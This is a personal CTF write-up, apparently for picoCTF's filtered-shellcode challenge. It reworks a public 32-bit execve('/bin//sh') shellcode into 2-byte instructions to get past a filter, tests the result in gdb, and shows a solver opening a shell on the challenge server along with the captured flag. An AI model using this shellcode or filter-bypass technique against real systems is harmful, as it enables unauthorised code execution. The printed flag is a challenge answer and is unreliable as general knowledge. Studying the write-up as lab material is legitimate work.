# Lesson
- shellcode  
  - Linux system calls set arguments in registers and are invoked by a software interrupt using "int 0x80".  
    - https://www.mztn.org/lxasm/int80.html  
    - https://www.mztn.org/lxasm/asm04.html  
- system call  
  - https://os.pubpub.org/pub/blog-1/release/4  
- kernel  
- how to understand a logic  
  - (light) grisp the overview with gdb  
  - (heavy) read code manually  
- `pwntools`
  ```zsh
  pwndbg> hexdump $eax
  ```

# Memo
1. check  
```zsh
$ file fun
fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped
$
$ checksec --file=./fun --output=json | jq .
{
  "./fun": {
    "relro": "partial",
    "canary": "no",
    "nx": "no",
    "pie": "no",
    "rpath": "no",
    "runpath": "no",
    "symbols": "yes",
    "fortify_source": "no",
    "fortified": "0",
    "fortify-able": "0"
  }
}
```

2. ghidra  

3. create shellcode  
https://shell-storm.org/shellcode/files/shellcode-517.html  
```
"\x31\xc9"                  // xor    %ecx,%ecx
"\xf7\xe1"                  // mul    %ecx
"\x51"                      // push   %ecx
"\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f
"\x89\xe3"                  // mov    %esp,%ebx
"\xb0\x0b"                  // mov    $0xb,%al
"\xcd\x80"                  // int    $0x80
```
2 byte  
https://www.mztn.org/lxasm64/amd09_shift.html  
```zsh
$ pwn asm -c 32 nop
90
$ pwn asm -c 32 "nop;nop"
9090
$ pwn asm -c 32 "push eax"
50
$ pwn asm -c 32 "push 43"
$ pwn asm -c 32 "xor eax eax"
$ pwn asm -c 32 "xor eax,eax"
$ pwn asm -c 32 "mov al, 0x68"
$ pwn asm -c 32 "shl eax"
$ pwn asm -c 32 "mov ax 0x6873"
$ pwn asm -c 32 "mov ax, 0x6873"
$ pwn asm -c 32 "shl eax, 12"
$ pwn asm -c 32 "shl eax, 1"
$ pwn asm -c 32 "shl eax, 2"
$ pwn asm -c 32 "mov al, 0x73"
$ pwn asm -c 32 "mov al, 0x2f"
$ pwn asm -c 32 "push eax"
$ pwn asm -c 32 "mov al, 0x6e"
$ pwn asm -c 32 "mov al, 0x69"
```
```zsh
"\x31\xc9"                  // xor    %ecx,%ecx
"\xf7\xe1"                  // mul    %ecx
"\x51"                      // push   %ecx

\x90                        // nop

// "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f

###
\x31\xc0 // xor eax,eax

\xb0\x68                  // mov al, 0x68
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax


\xb0\x73                  // mov al, 0x73
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax

\xb0\x2f                  // mov al, 0x2f
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax

\xb0\x2f                  // mov al, 0x2f

\x50                      // push eax
\x90                      // nop


// "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f

\x31\xc0 // xor eax,eax

\xb0\x6e                  // mov al, 0x6e
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax


\xb0\x69                  // mov al, 0x69
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax

\xb0\x62                  // mov al, 0x62
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax
\xd1\xe0                  // shl eax

\xb0\x2f                  // mov al, 0x2f

\x50                      // push eax
\x90                      // nop

###

"\x89\xe3"                  // mov    %esp,%ebx
"\xb0\x0b"                  // mov    $0xb,%al
"\xcd\x80"                  // int    $0x80
```

```zsh
$ pwn asm -c 32 "shl eax, 1"
d1e0
```

4. test shelcode
```zsh
$ nasm -f elf32 test.asm -o test.o
$ ld -s -o test test.o            
ld: i386 architecture of input file 'test.o' is incompatible with i386:x86-64 output
$ ld -m elf_i386 -s -o test test.o
$ ./test
zsh: segmentation fault  ./test
$ gdb ./test
```

patterns.  
I skip to write "shl eax, 1" 8 times with "shl eax, 8".
- OK
  ```
  mov     al,     0x68
  shl     eax,    8
  mov     al,     0x73
  shl     eax,    8
  mov     al,     0x2f
  shl     eax,    8
  mov     al,     0x2f
  push    eax
  ```
  ```
  EAX  0x68732f2f ('//sh')

  00:0000│ esp 0xffffcd88 ◂— '//sh'
  ```
- OK
  ```
  mov     al,     0x68
  shl     eax,    8
  mov     al,     0x73
  shl     eax,    8
  mov     al,     0x2f
  push    eax
  ```
  ```
  EAX  0x68732f

  00:0000│ esp 0xffffcd88 ◂— 0x68732f /* '/sh' */
  ```
- OK
  ```
  mov     al,     0x00
  shl     eax,    8
  mov     al,     0x68
  shl     eax,    8
  mov     al,     0x73
  shl     eax,    8
  mov     al,     0x2f
  push    eax
  ```
  ```
  EAX  0x68732f

  00:0000│ esp 0xffffcd88 ◂— 0x68732f /* '/sh' */
  ```
- NG
  ```
  mov     al,     0x68
  shl     eax,    8
  mov     al,     0x73
  shl     eax,    8
  mov     al,     0x2f
  shl     eax,    8
  mov     al,     0x00
  push    eax
  ```
  ```
  EAX  0x68732f00

  00:0000│ esp 0xffffcd88 ◂— 0x68732f00
  ```

5. write solver  
test on local  
```zsh
$ python solver.py LOCAL
```
It works well.
```zsh
$ python solver.py
[+] Opening connection to mercury.picoctf.net on port 37853: Done
b'Give me code to run:'
[*] Switching to interactive mode

$ ls
flag.txt
fun
fun.c
xinet_startup.sh
$ cat flag.txt
picoCTF{th4t_w4s_fun_edd8e0b87b2038ea}$
$
```

# Ref
- https://cyb3rwhitesnake.medium.com/picoctf-filtered-shellcode-pwn-3d69010376df  
- https://sh0ebill.hatenablog.com/entry/2022/11/13/204614  
- https://zenn.dev/t0m3y/scraps/275ba361c564c8  
- https://www.mztn.org/lxasm/asm01.html  
- https://stackoverflow.com/questions/19200333/architecture-of-i386-input-file-is-incompatible-with-i386x86-64  
